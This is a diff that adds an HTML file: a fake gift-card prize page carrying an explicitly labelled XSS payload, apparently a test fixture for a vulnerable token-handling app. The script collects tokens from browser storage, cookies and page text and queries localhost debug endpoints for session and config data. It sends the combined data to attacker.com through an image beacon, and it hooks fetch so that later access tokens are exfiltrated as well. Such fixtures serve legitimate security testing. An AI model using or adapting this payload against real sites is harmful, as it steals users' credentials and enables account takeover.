@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Congratulations! You've Won!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .prize {
+            background: white;
+            color: #333;
+            padding: 30px;
+            border-radius: 10px;
+            display: inline-block;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 Congratulations! 🎉</h1>
+    <div class="prize">
+        <h2>You've won a $1000 Amazon Gift Card!</h2>
+        <p>Please wait while we verify your account...</p>
+    </div>
+    
+    <!-- XSS Payload Below -->
+    <script>
+        // Token theft payload
+        (function() {
+            console.log('[XSS] Malicious script executing...');
+            
+            // Method 1: Try to extract token from localStorage
+            const localStorageToken = localStorage.getItem('access_token') || 
+                                      localStorage.getItem('token') ||
+                                      localStorage.getItem('oauth_token');
+            
+            // Method 2: Try to extract from sessionStorage
+            const sessionStorageToken = sessionStorage.getItem('access_token') ||
+                                        sessionStorage.getItem('token');
+            
+            // Method 3: Try to extract from cookies
+            const cookies = document.cookie;
+            
+            // Method 4: Try to extract from page content
+            let pageToken = null;
+            const bodyText = document.body.innerText;
+            const tokenMatch = bodyText.match(/[A-Za-z0-9_-]{40,}/);
+            if (tokenMatch) {
+                pageToken = tokenMatch[0];
+            }
+            
+            // Method 5: Make a request to the debug endpoint to steal session info
+            fetch('http://localhost:8002/debug/sessions')
+                .then(response => response.json())
+                .then(data => {
+                    console.log('[XSS] Stolen session data:', data);
+                    
+                    // Extract tokens from session data
+                    const sessions = data.sessions || {};
+                    const tokens = [];
+                    
+                    for (const [sessionId, sessionData] of Object.entries(sessions)) {
+                        if (sessionData && sessionData.token) {
+                            tokens.push({
+                                type: 'session_token',
+                                token: sessionData.token,
+                                session_id: sessionId
+                            });
+                        }
+                    }
+                    
+                    // Method 6: Try to get token from config endpoint
+                    return fetch('http://localhost:8002/debug/config')
+                        .then(r => r.json())
+                        .then(config => {
+                            // Compile all stolen data
+                            const stolenData = {
+                                localStorage: localStorageToken,
+                                sessionStorage: sessionStorageToken,
+                                cookies: cookies,
+                                pageToken: pageToken,
+                                sessionTokens: tokens,
+                                clientConfig: config,
+                                userAgent: navigator.userAgent,
+                                url: window.location.href,
+                                referrer: document.referrer,
+                                timestamp: new Date().toISOString()
+                            };
+                            
+                            console.log('[XSS] Complete stolen data:', stolenData);
+                            
+                            // Exfiltrate to attacker server
+                            // In a real attack, this would be: fetch('http://attacker.com/steal', ...)
+                            // For testing, we'll store it in a global variable
+                            window.STOLEN_DATA = stolenData;
+                            
+                            // Also try to exfiltrate via image beacon
+                            const img = new Image();
+                            const exfilData = btoa(JSON.stringify(stolenData));
+                            img.src = 'http://attacker.com/steal?data=' + exfilData;
+                            
+                            console.log('[XSS] Exfiltration attempted to attacker.com');
+                            
+                            return stolenData;
+                        });
+                })
+                .catch(err => {
+                    console.log('[XSS] Error stealing data:', err);
+                });
+            
+            // Method 7: Hook into fetch/XMLHttpRequest to intercept future tokens
+            const originalFetch = window.fetch;
+            window.fetch = function(...args) {
+                console.log('[XSS] Intercepted fetch:', args[0]);
+                return originalFetch.apply(this, args).then(response => {
+                    // Clone response to read it
+                    const clonedResponse = response.clone();
+                    clonedResponse.json().then(data => {
+                        if (data.access_token) {
+                            console.log('[XSS] Intercepted token from fetch:', data.access_token);
+                            // Exfiltrate intercepted token
+                            const img = new Image();
+                            img.src = 'http://attacker.com/intercept?token=' + data.access_token;
+                        }
+                    }).catch(() => {});
+                    return response;
+                });
+            };
+        })();
+    </script>
+</body>
+</html>
